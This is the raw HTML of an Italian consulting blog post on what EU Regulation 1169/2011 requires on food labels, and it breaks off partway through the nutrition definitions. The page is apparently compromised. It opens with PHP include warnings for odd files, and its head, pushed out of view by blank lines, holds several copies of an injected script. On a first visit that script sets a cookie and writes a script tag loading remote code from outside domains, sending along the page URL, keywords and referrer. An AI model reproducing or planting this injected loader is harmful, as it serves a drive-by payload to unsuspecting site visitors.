@@ -1,0 +1,393 @@
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/core/admin.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>82</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/core/admin.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>82</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/core/admin.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>82</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/uploads/2013/admin.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>85</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/uploads/2013/admin.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>85</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/wp-content/uploads/2013/admin.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>85</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/js_composer/stats.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>88</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/js_composer/stats.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>88</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/js_composer/stats.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/index.php</b> on line <b>88</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/contact-form-7/view.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>105</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/contact-form-7/view.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>105</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/contact-form-7/view.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>105</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/view.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>114</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/view.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>114</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/wp-content/plugins/bbpress/includes/view.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>114</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/sito-test/wp-admin/network/list.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>126</b><br />
+<br />
+<b>Warning</b>:  include(/web/htdocs/www.ef-consulting.it/home/sito-test/wp-admin/network/list.php): failed to open stream: No such file or directory in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>126</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/web/htdocs/www.ef-consulting.it/home/sito-test/wp-admin/network/list.php' for inclusion (include_path='.:/php5.5/lib/php/') in <b>/web/htdocs/www.ef-consulting.it/home/wp-config.php</b> on line <b>126</b><br />
+<!DOCTYPE html>
+
+<html lang="it-IT">
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+	<title>Cosa è obbligatorio in una etichetta alimentare? | EFConsulting</title>
+	<link rel="pingback" href="http://www.ef-consulting.it/xmlrpc.php" />
+        	<link rel="shortcut icon" href="http://www.ef-consulting.it/wp-content/uploads/2014/07/efcv3png16X16.png" />
+    	<link rel="alternate" type="application/rss+xml" title="EFConsulting &raquo; Feed" href="http://www.ef-consulting.it/feed/" />
+<link rel="alternate" type="application/rss+xml" title="EFConsulting &raquo; Feed dei commenti" href="http://www.ef-consulting.it/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="EFConsulting &raquo; Cosa è obbligatorio in una etichetta alimentare? Feed dei commenti" href="http://www.ef-consulting.it/cosa-sara-obbligatorio-in-una-etichetta-alimentare/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.ef-consulting.it\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.10"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;return g&&g.fillText?(g.textBaseline="top",g.font="600 32px Arial","flag"===a?(g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3):"diversity"===a?(g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e):("simple"===a?g.fillText(h(55357,56835),0,0):g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='http://www.ef-consulting.it/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.4' type='text/css' media='all' />
+<link rel='stylesheet' id='go_pricing_styles-css'  href='http://www.ef-consulting.it/wp-content/plugins/go_pricing.tmp/assets/css/go_pricing_styles.css?ver=2.1' type='text/css' media='all' />
+<link rel='stylesheet' id='go_pricing_jqplugin-mediaelementjs-css'  href='http://www.ef-consulting.it/wp-content/plugins/go_pricing.tmp/assets/plugins/js/mediaelementjs/mediaelementplayer.min.css?ver=2.1' type='text/css' media='all' />
+<link rel='stylesheet' id='go_pricing_jqplugin-mediaelementjs-skin-css'  href='http://www.ef-consulting.it/wp-content/plugins/go_pricing.tmp/assets/plugins/js/mediaelementjs/skin/mediaelementplayer.css?ver=2.1' type='text/css' media='all' />
+<link rel='stylesheet' id='layerslider_css-css'  href='http://www.ef-consulting.it/wp-content/plugins/layerslider/css/layerslider.css?ver=4.6.3' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-settings-css'  href='http://www.ef-consulting.it/wp-content/plugins/revslider/rs-plugin/css/settings.css?ver=4.4.10' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-captions-css'  href='http://www.ef-consulting.it/wp-content/plugins/revslider/rs-plugin/css/captions.css?ver=4.4.10' type='text/css' media='all' />
+<link rel='stylesheet' id='wpex-style-css'  href='http://www.ef-consulting.it/wp-content/themes/wpex-thunder/style.css?ver=4.4.10' type='text/css' media='all' />
+<link rel='stylesheet' id='wpgmp-frontend-css'  href='http://www.ef-consulting.it/wp-content/plugins/wp-google-map-plugin//assets/css/frontend.css?ver=4.4.10' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/go_pricing.tmp/assets/js/go_pricing_scripts.js?ver=2.1'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/go_pricing.tmp/assets/plugins/js/mediaelementjs/mediaelement-and-player.min.js?ver=2.1'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/layerslider/js/layerslider.kreaturamedia.jquery.js?ver=4.6.3'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/layerslider/js/jquery-easing-1.3.js?ver=1.3.0'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/layerslider/js/jquerytransit.js?ver=0.9.9'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/layerslider/js/layerslider.transitions.js?ver=4.6.3'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?ver=4.4.10'></script>
+<script type='text/javascript' src='http://maps.google.com/maps/api/js?libraries=geometry%2Cplaces%2Cweather%2Cpanoramio%2Cdrawing&#038;language=en&#038;ver=4.4.10'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpgmp_local = {"language":"en","urlforajax":"http:\/\/www.ef-consulting.it\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/wp-google-map-plugin//assets/js/maps.js?ver=4.4.10'></script>
+<link rel='https://api.w.org/' href='http://www.ef-consulting.it/wp-json/' />
+<link rel="canonical" href="http://www.ef-consulting.it/cosa-sara-obbligatorio-in-una-etichetta-alimentare/" />
+<link rel='shortlink' href='http://www.ef-consulting.it/?p=10231' />
+<link rel="alternate" type="application/json+oembed" href="http://www.ef-consulting.it/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.ef-consulting.it%2Fcosa-sara-obbligatorio-in-una-etichetta-alimentare%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://www.ef-consulting.it/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.ef-consulting.it%2Fcosa-sara-obbligatorio-in-una-etichetta-alimentare%2F&#038;format=xml" />
+
+<!-- platinum seo pack 1.3.8 -->
+<meta name="robots" content="index,follow,noodp,noydir" />
+<meta name="description" content="Ecco cosa sarà obbligatorio inserire in una etichetta alimentare, secondo il Regolamento Europeo n. 1169/2011 e non per tutti gli alimenti, per poter" />
+<link rel="canonical" href="http://www.ef-consulting.it/cosa-sara-obbligatorio-in-una-etichetta-alimentare/" />
+<!-- /platinum one seo pack -->
+<style type="text/css">body, #navbar li[class^="icon-"] > a,#navbar li[class*=" icon-"] > a{font-family:'Open Sans'; }</style><link href="http://fonts.googleapis.com/css?family=Open%20Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800&amp;subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic" rel="stylesheet" type="text/css"><!--[if IE]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]--><!--[if IE 7]><link rel="stylesheet" type="text/css" href="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/css/font-awesome-ie7.min.css" media="screen" /><![endif]--><!-- Custom CSS -->
+<style type="text/css">
+body .logo-icon { border: none; padding: 0; }body, body.home.page-template-templateshome-php { background-color: #ffffff !important; }body a { color: #ffffff; }#top-bar, .top-bar-nav-menu > li ul { background: #ddc69c; }.black-theme-skin #top-bar, .light-main-skin #top-bar, .top-bar-nav-menu > li, .top-bar-nav-menu > li ul li, .top-bar-nav-menu, .top-bar-nav-menu > li ul { border-color: #452822; }.top-bar-nav-menu > li > a, .top-bar-nav-menu > li ul a { color: #452822; }.top-bar-nav-menu > li > a:hover, .top-bar-nav-menu > li ul a:hover { color: #452822; }.top-bar-nav-menu > li > a:hover, .top-bar-nav-menu > li ul a:hover { background: #ddc69c; }#top-bar-searchform input, #top-bar-searchform input:focus { background: #452822; }#top-bar-searchform input, #top-bar-searchform input:focus { color: #ddc69c; }#top-bar-search-icon { color: #ddc69c !important; }#masthead { background: #452822!important; }.logo h1 a, .logo h2 a { color:#ddc69c!important; }.logo-icon { border-color:#ddc69c!important; }#navbar .dropdown-menu a { color:#ddc69c!important; }.wcmenucart-contents{border-color: #ddc69c !important; }#navbar .dropdown-menu > li > a:hover, #navbar .dropdown-menu > .current-menu-item > a, #navbar .dropdown-menu .current-menu-parent > a, #navbar .dropdown-menu .current-menu-parent > a:hover, #navbar .dropdown-menu > .current-menu-item > a:hover, .single-portfolio #navbar .dropdown-menu li.portfolio-link a, .single-services #navbar .dropdown-menu li.services-link a { color:#ddc69c!important; }.wcmenucart-contents:hover{border-color: #ddc69c !important; }#navbar .dropdown-menu ul { background:#452822!important; }#navbar .dropdown-menu ul a { color:#ddc69c!important; }#navbar .dropdown-menu ul li { border-color:#ddc69c!important; }#navbar .dropdown-menu ul a:hover { color:#ddc69c!important; }#navbar .dropdown-menu ul a:hover { background:#452822!important; }@media only screen and (max-width: 767px) { .wpex-responsive #navbar{ background:#ddc69c!important; } }#sidebar { background:#452822!important; }#footer { background:#452822!important; }#footer, #footer-widgets { color:#452822!important; }#footer a, #footer-bottom a { color:#452822!important; }#footer a:hover, #footer-bottom a:hover { color:#452822!important; }#footer-bottom { background:#ddc69c!important; }#footer-bottom { color:#452822!important; }#footer-bottom a { color:#452822!important; }#footer-bottom a:hover { color:#452822!important; }#footer-bottom .container { border-color:#ddc69c!important; }.testimonials-slider .home-testimonial-entry-author, .testimonial-entry-author span { background:#452822!important; }.portfolio-archives-filter li a:hover { background-color:#452822!important; }.portfolio-post-pagination li a:hover { background-color:#452822!important; }.services-archives-tabs li a:active, .services-archives-tabs li.ui-state-active a { background-color:#452822!important; }.services-archives-tabs li a:hover { background-color:#452822!important; }.services-post-slider .flex-direction-nav a:hover { background-color:#452822; }.gallery-format-post-slider .flex-direction-nav a:hover { background-color:#452822!important; }#sidebar .widget_nav_menu .current-menu-item a { background-color:#452822!important; }.theme-button, .button, input[type="button"], input[type="submit"], input[type="submit"] { background-color:#452822!important; }.theme-button:hover, button:hover, input[type="button"]:hover, input[type="submit"]:hover, #commentsbox input[type="submit"]:hover { background-color:#452822!important; }.site-main .wpb_tour .wpb_tabs_nav li a:hover { background-color:#452822 !important; }.site-main .wpb_tour .wpb_tabs_nav li.ui-tabs-active a { background-color: #79C277; }
+</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #ffffff; }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://faceandlook.home.pl/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://faceandlook.home.pl/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ayuth.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ayuth.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://lahoredeals.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://lahoredeals.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://1800fixphone.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://1800fixphone.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
+
+<!-- Begin Body -->
+<body class="single single-post postid-10231 single-format-standard custom-background wpex-theme full-width-main-layout light-main-skin brown-theme-skin wpex-responsive full-width-post wpb-js-composer js-comp-ver-3.6.14.1 vc_responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="wrap" class="clr">
+    
+    	<!-- Top Bar -->
+		        	<div id="top-bar" class="clr ">
+            	<div id="top-bar-inner" class="clr container">
+                    <div id="top-bar-left" class="col col-1 span_1_of_2">
+                        <nav id="top-bar-nav" class="top-bar-navigation clr">
+							                        </nav><!-- #top-bar-nav -->
+                    </div><!-- #top-bar-left -->
+                    <div id="top-bar-right" class="col span_1_of_2 clr">
+                    	                            <div id="top-bar-search" class="clr">
+                                <form method="get" id="top-bar-searchform" action="http://www.ef-consulting.it/" role="search">
+                                    <input type="search" name="s" value="" placeholder="Search..." />
+                                    <span id="top-bar-search-icon"><i class="icon-search"></i></span>
+                                </form>
+                            </div><!-- #top-bar-search -->
+                                                <div id="top-bar-social" class="clr">
+                        	                        </div><!-- #top-bar-social -->
+                    </div><!-- #top-bar-right -->
+                </div><!-- #top-bar-inner -->
+            </div><!-- #top-bar -->
+        	
+    
+    
+    	<!-- Header  -->
+        <header id="masthead" class="site-header clr fixed-scroll" role="banner">
+            <div id="masthead-inner" class="container clr">
+                <div class="logo">
+                                                                    <a href="http://www.ef-consulting.it/" title="EFConsulting" rel="home"><img src="http://www.ef-consulting.it/wp-content/uploads/2014/08/efcv2bsandxsito.png" alt="" /></a>
+                                    </div><!-- .logo -->
+                <div id="navbar" class="clr">      
+                    <nav id="site-navigation" class="navigation main-navigation clr" role="navigation">
+                        <div class="menu-home-container"><ul id="menu-home" class="nav-menu dropdown-menu"><li id="menu-item-9794" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9794"><a href="http://www.ef-consulting.it/">Home</a></li>
+<li id="menu-item-9921" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9921"><a href="http://www.ef-consulting.it/richiedi-informazioni/">Richiedi informazioni</a></li>
+</ul></div>                    </nav><!-- #site-navigation -->
+                </div><!-- #navbar -->
+            </div><!-- #masthead-inner -->
+        </header><!-- #masthead-two -->
+ 
+        <div id="main" class="site-main clr wpex-fitvids">
+	<header class="page-header">
+    	<div class="container clr">
+			<h1 class="page-header-title">Blog</h1>
+                    </div><!-- .container -->
+	</header><!-- .page-header -->
+    
+    <div class="container clr">
+        <section id="primary" class="content-area clr">
+            <div id="content" class="site-content clr" role="main"> 
+                <article class="entry clr">
+                	                    		
+	
+
+										                        <h1 class="post-title">Cosa è obbligatorio in una etichetta alimentare?</h1>
+                                                    <ul class="meta clr">
+                                <li class="meta-date"><i class="icon-time"></i>29 agosto 2014</li> 
+                                                                                                    <li class="meta-seperator">/</i>
+                                    <li class="meta-category"><i class="icon-file-text-alt"></i><a href="http://www.ef-consulting.it/category/senza-categoria/" title="Senza categoria">Senza categoria</a></li>
+                                                                                                    <li class="meta-seperator">/</i>
+                                    <li class="meta-comments comment-scroll"><i class="icon-comments"></i><a href="http://www.ef-consulting.it/cosa-sara-obbligatorio-in-una-etichetta-alimentare/#respond" class="comments-link" >0 Comments</a></li>
+                                <!-- .post-entry-comments -->
+                            </ul><!-- .meta -->
+                                                <p>Ecco cosa sarà obbligatorio inserire in una etichetta alimentare, secondo il Regolamento Europeo n. 1169/2011 e non per tutti gli alimenti, per poter permettere al consumatore finale una facile comprensione del contenuto del prodotto:</p>
+<div class="page" title="Page 46">
+<div class="layoutArea">
+<div class="column">
+<p>Energia</p>
+<p>Grassi (di cui acidi grassi)</p>
+<p>Carboidrati (di cui zuccheri)</p>
+<p>Proteine</p>
+<p>Sale</p>
+<p>&nbsp;</p>
+<p>Ed ecco le definizioni del Regolamento Europeo n. 1169/2011 per queste indicazioni nutrizionali:</p>
+<p>«grassi»: i lipidi totali, compresi i fosfolipidi;</p>
+<p>«acidi grassi saturi»: gli acidi grassi che non presentano doppi legami;</p>
